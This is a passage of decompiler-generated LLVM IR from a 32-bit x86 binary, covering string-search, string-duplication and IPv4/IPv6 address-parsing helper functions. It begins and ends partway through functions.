  br i1 %v8_8055b4d, label %dec_label_pc_8055b58, label %dec_label_pc_8055b50

dec_label_pc_8055b58:                             ; preds = %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge, %dec_label_pc_8055b34
  %v2_8055b5a.lcssa = phi i32 [ %v2_8055b49, %dec_label_pc_8055b34 ], [ %v7_8055b51, %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8055b5a = inttoptr i32 %v2_8055b5a.lcssa to i8*
  store i8 0, i8* %v3_8055b5a, align 1
  %v4_8055b5a = load i32, i32* %edi.global-to-local, align 4
  %v5_8055b5a = load i1, i1* @df, align 1
  %v6_8055b5a = select i1 %v5_8055b5a, i32 -1, i32 1
  %v7_8055b5a = add i32 %v6_8055b5a, %v4_8055b5a
  store i32 %v7_8055b5a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055b5b

dec_label_pc_8055b5b:                             ; preds = %dec_label_pc_8055b50, %dec_label_pc_8055b58
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8055b5f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055b5f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8055b4d, { 1, 0 }
  uselistorder i32 %v0_8055b52, { 1, 0 }
  uselistorder i32 %v7_8055b51, { 0, 2, 1 }
  uselistorder i1 %v5_8055b51, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055b5b, { 1, 0 }
  uselistorder label %dec_label_pc_8055b50, { 1, 0 }
}

define i32 @function_8055b64(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055b64:
  %v0_8055b65 = load i32, i32* @ebx, align 4
  %v4_8055b66 = urem i32 %arg2, 256
  %v4_8055b6a = ptrtoint i8* %arg1 to i32
  %v2_8055b753 = urem i32 %v4_8055b6a, 4
  %v3_8055b754 = icmp eq i32 %v2_8055b753, 0
  %v1_8055b778 = icmp eq i1 %v3_8055b754, false
  %v4_8055b70 = trunc i32 %arg2 to i8
  br i1 %v1_8055b778, label %dec_label_pc_8055b70, label %dec_label_pc_8055b79

dec_label_pc_8055b70:                             ; preds = %dec_label_pc_8055b64, %dec_label_pc_8055b74
  %v0_8055b74 = phi i32 [ %v1_8055b74, %dec_label_pc_8055b74 ], [ %v4_8055b6a, %dec_label_pc_8055b64 ]
  %v1_8055b70 = inttoptr i32 %v0_8055b74 to i8*
  %v2_8055b70 = load i8, i8* %v1_8055b70, align 1
  %v15_8055b70 = icmp eq i8 %v2_8055b70, %v4_8055b70
  br i1 %v15_8055b70, label %dec_label_pc_8055bc4, label %dec_label_pc_8055b74

dec_label_pc_8055b74:                             ; preds = %dec_label_pc_8055b70
  %v1_8055b74 = add i32 %v0_8055b74, 1
  %v2_8055b75 = urem i32 %v1_8055b74, 4
  %v3_8055b75 = icmp eq i32 %v2_8055b75, 0
  %v1_8055b77 = icmp eq i1 %v3_8055b75, false
  br i1 %v1_8055b77, label %dec_label_pc_8055b70, label %dec_label_pc_8055b79

dec_label_pc_8055b79:                             ; preds = %dec_label_pc_8055b64, %dec_label_pc_8055b74
  %v0_8055b7c = phi i32 [ %v1_8055b74, %dec_label_pc_8055b74 ], [ %v4_8055b6a, %dec_label_pc_8055b64 ]
  %v2_8055b80 = mul nuw nsw i32 %v4_8055b66, 256
  %v2_8055b83 = or i32 %v2_8055b80, %v4_8055b66
  %v2_8055b87 = mul i32 %v2_8055b83, 65536
  %v2_8055b8a = or i32 %v2_8055b87, %v2_8055b83
  br label %dec_label_pc_8055b8c

dec_label_pc_8055b8c:                             ; preds = %dec_label_pc_8055bbc, %dec_label_pc_8055b8c, %dec_label_pc_8055b79
  %v0_8055b90 = phi i32 [ %v0_8055b7c, %dec_label_pc_8055b79 ], [ %v1_8055b90, %dec_label_pc_8055b8c ], [ %v1_8055b90, %dec_label_pc_8055bbc ]
  %v2_8055b8e = inttoptr i32 %v0_8055b90 to i32*
  %v3_8055b8e = load i32, i32* %v2_8055b8e, align 4
  %v4_8055b8e = xor i32 %v3_8055b8e, %v2_8055b8a
  %v1_8055b90 = add i32 %v0_8055b90, 4
  %v1_8055b93 = add i32 %v4_8055b8e, 2130640639
  %v1_8055b99 = sub i32 -1, %v4_8055b8e
  %v2_8055b9b = xor i32 %v1_8055b93, %v1_8055b99
  %v1_8055b9d = and i32 %v2_8055b9b, -2130640640
  %v2_8055b9d = icmp eq i32 %v1_8055b9d, 0
  br i1 %v2_8055b9d, label %dec_label_pc_8055b8c, label %dec_label_pc_8055ba4

dec_label_pc_8055ba4:                             ; preds = %dec_label_pc_8055b8c
  %v2_8055ba7 = inttoptr i32 %v0_8055b90 to i8*
  %v3_8055ba7 = load i8, i8* %v2_8055ba7, align 1
  %v16_8055ba7 = icmp eq i8 %v3_8055ba7, %v4_8055b70
  br i1 %v16_8055ba7, label %dec_label_pc_8055bc4, label %dec_label_pc_8055bac

dec_label_pc_8055bac:                             ; preds = %dec_label_pc_8055ba4
  %v1_8055bac = add i32 %v0_8055b90, 1
  %v2_8055baf = inttoptr i32 %v1_8055bac to i8*
  %v3_8055baf = load i8, i8* %v2_8055baf, align 1
  %v16_8055baf = icmp eq i8 %v3_8055baf, %v4_8055b70
  br i1 %v16_8055baf, label %dec_label_pc_8055bc4, label %dec_label_pc_8055bb4

dec_label_pc_8055bb4:                             ; preds = %dec_label_pc_8055bac
  %v1_8055bb4 = add i32 %v0_8055b90, 2
  %v2_8055bb7 = inttoptr i32 %v1_8055bb4 to i8*
  %v3_8055bb7 = load i8, i8* %v2_8055bb7, align 1
  %v16_8055bb7 = icmp eq i8 %v3_8055bb7, %v4_8055b70
  br i1 %v16_8055bb7, label %dec_label_pc_8055bc4, label %dec_label_pc_8055bbc

dec_label_pc_8055bbc:                             ; preds = %dec_label_pc_8055bb4
  %v1_8055bbc = add i32 %v0_8055b90, 3
  %v2_8055bbf = inttoptr i32 %v1_8055bbc to i8*
  %v3_8055bbf = load i8, i8* %v2_8055bbf, align 1
  %v16_8055bbf = icmp eq i8 %v3_8055bbf, %v4_8055b70
  %v1_8055bc2 = icmp eq i1 %v16_8055bbf, false
  br i1 %v1_8055bc2, label %dec_label_pc_8055b8c, label %dec_label_pc_8055bc4

dec_label_pc_8055bc4:                             ; preds = %dec_label_pc_8055b70, %dec_label_pc_8055bbc, %dec_label_pc_8055bb4, %dec_label_pc_8055bac, %dec_label_pc_8055ba4
  %v0_8055bc6 = phi i32 [ %v1_8055bbc, %dec_label_pc_8055bbc ], [ %v1_8055bb4, %dec_label_pc_8055bb4 ], [ %v1_8055bac, %dec_label_pc_8055bac ], [ %v0_8055b90, %dec_label_pc_8055ba4 ], [ %v0_8055b74, %dec_label_pc_8055b70 ]
  store i32 %v0_8055b65, i32* @ebx, align 4
  ret i32 %v0_8055bc6

; uselistorder directives
  uselistorder i32 %v1_8055b90, { 1, 0 }
  uselistorder i32 %v2_8055b83, { 1, 0 }
  uselistorder i32 %v1_8055b74, { 1, 0, 2 }
  uselistorder i32 %v4_8055b6a, { 2, 1, 0 }
  uselistorder i32 %v4_8055b66, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8055bc4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8055b79, { 1, 0 }
  uselistorder label %dec_label_pc_8055b70, { 1, 0 }
}

define i32 @function_8055bc8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055bc8:
  %v2_8055bea30 = load i8, i8* %arg1, align 1
  %v4_8055bec34 = icmp eq i8 %v2_8055bea30, 0
  br i1 %v4_8055bec34, label %dec_label_pc_8055bf4, label %dec_label_pc_8055bf0.lr.ph

dec_label_pc_8055bf0.lr.ph:                       ; preds = %dec_label_pc_8055bc8
  %v3_8055bea31 = zext i8 %v2_8055bea30 to i32
  %v4_8055bea.pre = load i32, i32* @eax, align 4
  %v5_8055bea32 = and i32 %v4_8055bea.pre, -256
  %v6_8055bea33 = or i32 %v3_8055bea31, %v5_8055bea32
  %v4_8055bd1 = ptrtoint i8* %arg1 to i32
  %v1_8055bdc18 = inttoptr i32 %arg2 to i8*
  %v4_8055bdc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055bf0

dec_label_pc_8055bd7:                             ; preds = %dec_label_pc_8055bf0, %dec_label_pc_8055bdb
  %v6_8055bdc27 = phi i32 [ %v6_8055bdc, %dec_label_pc_8055bdb ], [ %v6_8055bdc22, %dec_label_pc_8055bf0 ]
  %v2_8055bdc26 = phi i8 [ %v2_8055bdc, %dec_label_pc_8055bdb ], [ %v2_8055bdc19, %dec_label_pc_8055bf0 ]
  %v0_8055bdb25 = phi i32 [ %v1_8055bdb, %dec_label_pc_8055bdb ], [ %arg2, %dec_label_pc_8055bf0 ]
  %v15_8055bd7 = icmp eq i8 %v2_8055bea37, %v2_8055bdc26
  br i1 %v15_8055bd7, label %dec_label_pc_8055be4, label %dec_label_pc_8055bdb

dec_label_pc_8055bdb:                             ; preds = %dec_label_pc_8055bd7
  %v1_8055bdb = add i32 %v0_8055bdb25, 1
  store i32 %v1_8055bdb, i32* @edx, align 4
  %v1_8055bdc = inttoptr i32 %v1_8055bdb to i8*
  %v2_8055bdc = load i8, i8* %v1_8055bdc, align 1
  %v3_8055bdc = zext i8 %v2_8055bdc to i32
  %v5_8055bdc = and i32 %v6_8055bdc27, -256
  %v6_8055bdc = or i32 %v3_8055bdc, %v5_8055bdc
  store i32 %v6_8055bdc, i32* @ecx, align 4
  %v4_8055bde = icmp eq i8 %v2_8055bdc, 0
  %v1_8055be0 = icmp eq i1 %v4_8055bde, false
  br i1 %v1_8055be0, label %dec_label_pc_8055bd7, label %dec_label_pc_8055bf4

dec_label_pc_8055be4:                             ; preds = %dec_label_pc_8055bd7
  %v1_8055be8 = add i32 %v0_8055bf435, 1
  %v1_8055be9 = add i32 %v0_8055be936, 1
  %v1_8055bea = inttoptr i32 %v1_8055be9 to i8*
  %v2_8055bea = load i8, i8* %v1_8055bea, align 1
  %v3_8055bea = zext i8 %v2_8055bea to i32
  %v5_8055bea = and i32 %v6_8055bea38, -256
  %v6_8055bea = or i32 %v3_8055bea, %v5_8055bea
  %v4_8055bec = icmp eq i8 %v2_8055bea, 0
  br i1 %v4_8055bec, label %dec_label_pc_8055bf4, label %dec_label_pc_8055bf0

dec_label_pc_8055bf0:                             ; preds = %dec_label_pc_8055bf0.lr.ph, %dec_label_pc_8055be4
  %v4_8055bdc.pre = phi i32 [ %v4_8055bdc.pre.pre, %dec_label_pc_8055bf0.lr.ph ], [ %v6_8055bdc27, %dec_label_pc_8055be4 ]
  %v6_8055bea38 = phi i32 [ %v6_8055bea33, %dec_label_pc_8055bf0.lr.ph ], [ %v6_8055bea, %dec_label_pc_8055be4 ]
  %v2_8055bea37 = phi i8 [ %v2_8055bea30, %dec_label_pc_8055bf0.lr.ph ], [ %v2_8055bea, %dec_label_pc_8055be4 ]
  %v0_8055be936 = phi i32 [ %v4_8055bd1, %dec_label_pc_8055bf0.lr.ph ], [ %v1_8055be9, %dec_label_pc_8055be4 ]
  %v0_8055bf435 = phi i32 [ 0, %dec_label_pc_8055bf0.lr.ph ], [ %v1_8055be8, %dec_label_pc_8055be4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8055bdc19 = load i8, i8* %v1_8055bdc18, align 1
  %v3_8055bdc20 = zext i8 %v2_8055bdc19 to i32
  %v5_8055bdc21 = and i32 %v4_8055bdc.pre, -256
  %v6_8055bdc22 = or i32 %v3_8055bdc20, %v5_8055bdc21
  store i32 %v6_8055bdc22, i32* @ecx, align 4
  %v4_8055bde23 = icmp eq i8 %v2_8055bdc19, 0
  %v1_8055be024 = icmp eq i1 %v4_8055bde23, false
  br i1 %v1_8055be024, label %dec_label_pc_8055bd7, label %dec_label_pc_8055bf4

dec_label_pc_8055bf4:                             ; preds = %dec_label_pc_8055bc8, %dec_label_pc_8055be4, %dec_label_pc_8055bf0, %dec_label_pc_8055bdb
  %v0_8055bf417 = phi i32 [ %v0_8055bf435, %dec_label_pc_8055bdb ], [ %v0_8055bf435, %dec_label_pc_8055bf0 ], [ 0, %dec_label_pc_8055bc8 ], [ %v1_8055be8, %dec_label_pc_8055be4 ]
  ret i32 %v0_8055bf417

; uselistorder directives
  uselistorder i32 %v6_8055bdc22, { 1, 0 }
  uselistorder i8 %v2_8055bdc19, { 1, 2, 0 }
  uselistorder i32 %v1_8055be9, { 1, 0 }
  uselistorder i32 %v6_8055bdc, { 1, 0 }
  uselistorder i8 %v2_8055bdc, { 1, 2, 0 }
  uselistorder i32 %v1_8055bdb, { 2, 1, 0 }
  uselistorder i8 %v2_8055bea30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055bf4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8055bf0, { 1, 0 }
}

define i32 @function_8055bfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055bfc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055bfc = load i32, i32* @edi, align 4
  %v0_8055bfd = load i32, i32* @esi, align 4
  %v0_8055bfe = load i32, i32* @ebx, align 4
  store i32 %v0_8055bfe, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8055c07 = inttoptr i32 %arg1 to i8*
  %v2_8055c07 = call i32 @function_80514b0(i8* %v1_8055c07)
  %v1_8055c0c = add i32 %v2_8055c07, 1
  store i32 %v1_8055c0c, i32* @esi, align 4
  %v1_8055c12 = call i32 @function_8051f6a(i32 %v1_8055c0c)
  store i32 %v1_8055c12, i32* %ebx.global-to-local, align 4
  %v1_8055c1c = icmp eq i32 %v1_8055c12, 0
  br i1 %v1_8055c1c, label %dec_label_pc_8055c2c, label %dec_label_pc_8055c20

dec_label_pc_8055c20:                             ; preds = %dec_label_pc_8055bfc
  %v0_8055c21 = load i32, i32* @esi, align 4
  %v0_8055c22 = load i32, i32* @edi, align 4
  %v3_8055c24 = inttoptr i32 %v1_8055c12 to i16*
  %v4_8055c24 = call i32 @function_8051414(i16* %v3_8055c24, i32 %v0_8055c22, i32 %v0_8055c21)
  %v0_8055c2c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055c2c

dec_label_pc_8055c2c:                             ; preds = %dec_label_pc_8055bfc, %dec_label_pc_8055c20
  %v0_8055c2c = phi i32 [ 0, %dec_label_pc_8055bfc ], [ %v0_8055c2c.pre, %dec_label_pc_8055c20 ]
  %v2_8055c2e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055c2e, i32* @ebx, align 4
  store i32 %v0_8055bfd, i32* @esi, align 4
  store i32 %v0_8055bfc, i32* @edi, align 4
  ret i32 %v0_8055c2c

; uselistorder directives
  uselistorder i32 %v1_8055c12, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_8051f6a, { 5, 4, 3, 2, 0, 1, 10, 9, 8, 7, 6 }
  uselistorder label %dec_label_pc_8055c2c, { 1, 0 }
}

define i32 @function_8055c34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8055c34:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_8055c36 = load i32, i32* @esi, align 4
  %v0_8055c3d = load i32, i32* @eax, align 4
  store i32 %v0_8055c3d, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8055c43 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8055c43, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8055c8b15 = inttoptr i32 %v0_8055c3d to i8*
  %v2_8055c8b16 = load i8, i8* %v1_8055c8b15, align 1
  %v3_8055c8b17 = sext i8 %v2_8055c8b16 to i32
  store i32 %v3_8055c8b17, i32* @ecx, align 4
  %v1_8055c8e18 = add i32 %v0_8055c3d, 1
  store i32 %v1_8055c8e18, i32* %ebx.global-to-local, align 4
  %v1_8055c8f19 = icmp eq i8 %v2_8055c8b16, 0
  %v1_8055c9120 = icmp eq i1 %v1_8055c8f19, false
  br i1 %v1_8055c9120, label %dec_label_pc_8055c4e, label %dec_label_pc_8055c93.thread

dec_label_pc_8055c93.thread:                      ; preds = %dec_label_pc_8055c34
  br label %dec_label_pc_8055cb0

dec_label_pc_8055c4e:                             ; preds = %dec_label_pc_8055c34, %dec_label_pc_8055c8b.backedge
  %v3_8055c8b22 = phi i32 [ %v3_8055c8b, %dec_label_pc_8055c8b.backedge ], [ %v3_8055c8b17, %dec_label_pc_8055c34 ]
  %v2_8055c8b21 = phi i8 [ %v2_8055c8b, %dec_label_pc_8055c8b.backedge ], [ %v2_8055c8b16, %dec_label_pc_8055c34 ]
  %v1_8055c4e = add nsw i32 %v3_8055c8b22, -48
  store i32 %v1_8055c4e, i32* %eax.global-to-local, align 4
  %v6_8055c54 = icmp ugt i32 %v1_8055c4e, 9
  br i1 %v6_8055c54, label %dec_label_pc_8055c77, label %dec_label_pc_8055c56

dec_label_pc_8055c56:                             ; preds = %dec_label_pc_8055c4e
  %v0_8055c56 = load i32, i32* @esi, align 4
  %v1_8055c56 = inttoptr i32 %v0_8055c56 to i8*
  %v2_8055c56 = load i8, i8* %v1_8055c56, align 1
  %v2_8055c59 = zext i8 %v2_8055c56 to i32
  %v3_8055c59 = mul nuw nsw i32 %v2_8055c59, 10
  %v3_8055c5c = add nsw i32 %v3_8055c59, %v1_8055c4e
  store i32 %v3_8055c5c, i32* %eax.global-to-local, align 4
  %v6_8055c65 = icmp ugt i32 %v3_8055c5c, 255
  br i1 %v6_8055c65, label %dec_label_pc_8055cb0, label %dec_label_pc_8055c67

dec_label_pc_8055c67:                             ; preds = %dec_label_pc_8055c56
  %v1_8055c67 = trunc i32 %v3_8055c5c to i8
  store i8 %v1_8055c67, i8* %v1_8055c56, align 1
  %v0_8055c69 = load i32, i32* @edx, align 4
  %v1_8055c69 = icmp eq i32 %v0_8055c69, 0
  %v1_8055c6b = icmp eq i1 %v1_8055c69, false
  br i1 %v1_8055c6b, label %dec_label_pc_8055c8b.backedge, label %dec_label_pc_8055c6d

dec_label_pc_8055c6d:                             ; preds = %dec_label_pc_8055c67
  %v0_8055c6d = load i32, i32* @edi, align 4
  %v1_8055c6d = add i32 %v0_8055c6d, 1
  store i32 %v1_8055c6d, i32* @edi, align 4
  %v1_8055c6e = add i32 %v0_8055c6d, -3
  %v6_8055c6e = sub i32 2, %v0_8055c6d
  %v7_8055c6e = and i32 %v6_8055c6e, %v1_8055c6d
  %v8_8055c6e = icmp slt i32 %v7_8055c6e, 0
  %v9_8055c6e = icmp eq i32 %v1_8055c6e, 0
  %v10_8055c6e = icmp slt i32 %v1_8055c6e, 0
  %v3_8055c71 = icmp eq i1 %v10_8055c6e, %v8_8055c6e
  %v4_8055c71 = icmp eq i1 %v9_8055c6e, false
  %v5_8055c71 = and i1 %v4_8055c71, %v3_8055c71
  br i1 %v5_8055c71, label %dec_label_pc_8055cb0, label %dec_label_pc_8055c73

dec_label_pc_8055c73:                             ; preds = %dec_label_pc_8055c6d
  %v1_8055c73 = and i32 %v0_8055c69, -256
  %v2_8055c73 = or i32 %v1_8055c73, 1
  store i32 %v2_8055c73, i32* @edx, align 4
  br label %dec_label_pc_8055c8b.backedge

dec_label_pc_8055c77:                             ; preds = %dec_label_pc_8055c4e
  %v9_8055c77 = icmp eq i8 %v2_8055c8b21, 46
  %v1_8055c7a = icmp eq i1 %v9_8055c77, false
  br i1 %v1_8055c7a, label %dec_label_pc_8055cb0, label %dec_label_pc_8055c7c

dec_label_pc_8055c7c:                             ; preds = %dec_label_pc_8055c77
  %v0_8055c7c = load i32, i32* @edx, align 4
  %v1_8055c7c = icmp eq i32 %v0_8055c7c, 0
  br i1 %v1_8055c7c, label %dec_label_pc_8055cb0, label %dec_label_pc_8055c80

dec_label_pc_8055c80:                             ; preds = %dec_label_pc_8055c7c
  %v0_8055c80 = load i32, i32* @edi, align 4
  %v9_8055c80 = icmp eq i32 %v0_8055c80, 4
  br i1 %v9_8055c80, label %dec_label_pc_8055cb0, label %dec_label_pc_8055c85

dec_label_pc_8055c85:                             ; preds = %dec_label_pc_8055c80
  %v0_8055c85 = load i32, i32* @esi, align 4
  %v1_8055c85 = add i32 %v0_8055c85, 1
  store i32 %v1_8055c85, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_8055c88 = inttoptr i32 %v1_8055c85 to i8*
  store i8 0, i8* %v1_8055c88, align 1
  br label %dec_label_pc_8055c8b.backedge

dec_label_pc_8055c8b.backedge:                    ; preds = %dec_label_pc_8055c85, %dec_label_pc_8055c73, %dec_label_pc_8055c67
  %v0_8055c8b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055c8b = inttoptr i32 %v0_8055c8b.pre to i8*
  %v2_8055c8b = load i8, i8* %v1_8055c8b, align 1
  %v3_8055c8b = sext i8 %v2_8055c8b to i32
  store i32 %v3_8055c8b, i32* @ecx, align 4
  %v1_8055c8e = add i32 %v0_8055c8b.pre, 1
  store i32 %v1_8055c8e, i32* %ebx.global-to-local, align 4
  %v1_8055c8f = icmp eq i8 %v2_8055c8b, 0
  %v1_8055c91 = icmp eq i1 %v1_8055c8f, false
  br i1 %v1_8055c91, label %dec_label_pc_8055c4e, label %dec_label_pc_8055c93

dec_label_pc_8055c93:                             ; preds = %dec_label_pc_8055c8b.backedge
  %v0_8055c93.pre = load i32, i32* @edi, align 4
  %v7_8055c96 = icmp sgt i32 %v0_8055c93.pre, 3
  br i1 %v7_8055c96, label %dec_label_pc_8055c98, label %dec_label_pc_8055cb0

dec_label_pc_8055c98:                             ; preds = %dec_label_pc_8055c93
  %v0_8055c98 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8055c43, i32* %eax.global-to-local, align 4
  %v3_8055ca1 = bitcast i32* %stack_var_-20 to i16*
  %v4_8055ca1 = call i32 @function_8051414(i16* %v3_8055ca1, i32 4, i32 %v0_8055c98)
  br label %dec_label_pc_8055cb2

dec_label_pc_8055cb0:                             ; preds = %dec_label_pc_8055c80, %dec_label_pc_8055c7c, %dec_label_pc_8055c77, %dec_label_pc_8055c6d, %dec_label_pc_8055c56, %dec_label_pc_8055c93.thread, %dec_label_pc_8055c93
  br label %dec_label_pc_8055cb2

dec_label_pc_8055cb2:                             ; preds = %dec_label_pc_8055c98, %dec_label_pc_8055cb0
  %storemerge = phi i32 [ 0, %dec_label_pc_8055cb0 ], [ 1, %dec_label_pc_8055c98 ]
  %v0_8055cb9 = phi i32 [ 0, %dec_label_pc_8055cb0 ], [ 1, %dec_label_pc_8055c98 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8055c36, i32* @esi, align 4
  ret i32 %v0_8055cb9

; uselistorder directives
  uselistorder i32 %v3_8055c8b, { 1, 0 }
  uselistorder i8 %v2_8055c8b, { 1, 2, 0 }
  uselistorder i32 %v1_8055c6e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8055cb2, { 1, 0 }
  uselistorder label %dec_label_pc_8055cb0, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8055c4e, { 1, 0 }
}

define i32 @function_8055cba(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055cba:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8055cba = load i32, i32* @ebp, align 4
  %v0_8055cbb = load i32, i32* @edi, align 4
  %v0_8055cbc = load i32, i32* @esi, align 4
  %v0_8055cbd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8055cc5 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8055cc5, i32* @edi, align 4
  %v9_8055cc9 = icmp eq i32 %arg1, 2
  br i1 %v9_8055cc9, label %dec_label_pc_8055cd9, label %dec_label_pc_8055cce

dec_label_pc_8055cce:                             ; preds = %dec_label_pc_8055cba
  %v9_8055cce = icmp eq i32 %arg1, 10
  %v1_8055cd1 = icmp eq i1 %v9_8055cce, false
  br i1 %v1_8055cd1, label %dec_label_pc_8055e6a, label %dec_label_pc_8055ce9

dec_label_pc_8055cd9:                             ; preds = %dec_label_pc_8055cba
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8055cc5, i32* @eax, align 4
  %v3_8055cdf = call i32 @function_8055c34(i32 %v0_8055cbd, i32 %v0_8055cbc, i32 %v0_8055cbb)
  store i32 %v3_8055cdf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e7c

dec_label_pc_8055ce9:                             ; preds = %dec_label_pc_8055cce
  %v2_8055cee = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055cee, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8055cf3 = call i32 @function_805143c(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8055cf3, i32* @ebx, align 4
  %v2_8055cfa = add i32 %v5_8055cf3, 16
  store i32 %v2_8055cfa, i32* %eax.global-to-local, align 4
  %v0_8055d04 = load i32, i32* @edi, align 4
  %v1_8055d04 = inttoptr i32 %v0_8055d04 to i8*
  %v2_8055d04 = load i8, i8* %v1_8055d04, align 1
  %v11_8055d04 = icmp eq i8 %v2_8055d04, 58
  %v1_8055d07 = icmp eq i1 %v11_8055d04, false
  br i1 %v1_8055d07, label %dec_label_pc_8055d9a, label %dec_label_pc_8055d09

dec_label_pc_8055d09:                             ; preds = %dec_label_pc_8055ce9
  %v1_8055d09 = add i32 %v0_8055d04, 1
  store i32 %v1_8055d09, i32* @edi, align 4
  %v1_8055d0a = inttoptr i32 %v1_8055d09 to i8*
  %v2_8055d0a = load i8, i8* %v1_8055d0a, align 1
  %v11_8055d0a = icmp eq i8 %v2_8055d0a, 58
  %v1_8055d0d = icmp eq i1 %v11_8055d0a, false
  br i1 %v1_8055d0d, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d9a

dec_label_pc_8055d21:                             ; preds = %dec_label_pc_8055dda
  %v4_8055d29 = call i32 @function_8051474(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805c974.412, i32 0, i32 0), i32 %v2_8055de1)
  store i32 %v4_8055d29, i32* %eax.global-to-local, align 4
  %v0_8055d2e = load i32, i32* @edi, align 4
  %v1_8055d2e = add i32 %v0_8055d2e, 1
  store i32 %v1_8055d2e, i32* @edi, align 4
  %v1_8055d32 = icmp eq i32 %v4_8055d29, 0
  br i1 %v1_8055d32, label %dec_label_pc_8055d51, label %dec_label_pc_8055d36

dec_label_pc_8055d36:                             ; preds = %dec_label_pc_8055d21
  %v0_8055d36 = load i32, i32* @ebp, align 4
  %v2_8055d36 = mul i32 %v0_8055d36, 16
  %v1_8055d39 = add i32 %v4_8055d29, -134596980
  store i32 %v1_8055d39, i32* %eax.global-to-local, align 4
  %v2_8055d3e = or i32 %v2_8055d36, %v1_8055d39
  store i32 %v2_8055d3e, i32* @ebp, align 4
  %tmp124 = icmp ult i32 %v2_8055d3e, 65536
  br i1 %tmp124, label %dec_label_pc_8055dda.outer, label %dec_label_pc_8055e7a

dec_label_pc_8055dda.outer:                       ; preds = %dec_label_pc_8055d36, %dec_label_pc_8055d9a
  %v0_8055ddd36 = phi i32 [ %v1_8055d2e, %dec_label_pc_8055d36 ], [ %stack_var_-36.0.in, %dec_label_pc_8055d9a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8055d36 ], [ %stack_var_-44.0, %dec_label_pc_8055d9a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8055d36 ], [ %stack_var_-36.0, %dec_label_pc_8055d9a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8055d36 ], [ 0, %dec_label_pc_8055d9a ]
  %v4_8055d56 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8055d5b = icmp eq i1 %v4_8055d56, false
  br label %dec_label_pc_8055dda

dec_label_pc_8055d51:                             ; preds = %dec_label_pc_8055d21
  %v0_8055d51 = load i32, i32* @esi, align 4
  %v9_8055d51 = icmp eq i32 %v0_8055d51, 58
  %v1_8055d54 = icmp eq i1 %v9_8055d51, false
  br i1 %v1_8055d54, label %dec_label_pc_8055da6, label %dec_label_pc_8055d56

dec_label_pc_8055d56:                             ; preds = %dec_label_pc_8055d51
  br i1 %v1_8055d5b, label %dec_label_pc_8055d72, label %dec_label_pc_8055d5d

dec_label_pc_8055d5d:                             ; preds = %dec_label_pc_8055d56
  %v5_8055d5d = icmp eq i8* %stack_var_-44.1, null
  %v1_8055d62 = icmp eq i1 %v5_8055d5d, false
  br i1 %v1_8055d62, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d68

dec_label_pc_8055d68:                             ; preds = %dec_label_pc_8055d5d
  %v0_8055d68 = load i32, i32* @ebx, align 4
  %v5_8055d68 = inttoptr i32 %v0_8055d68 to i8*
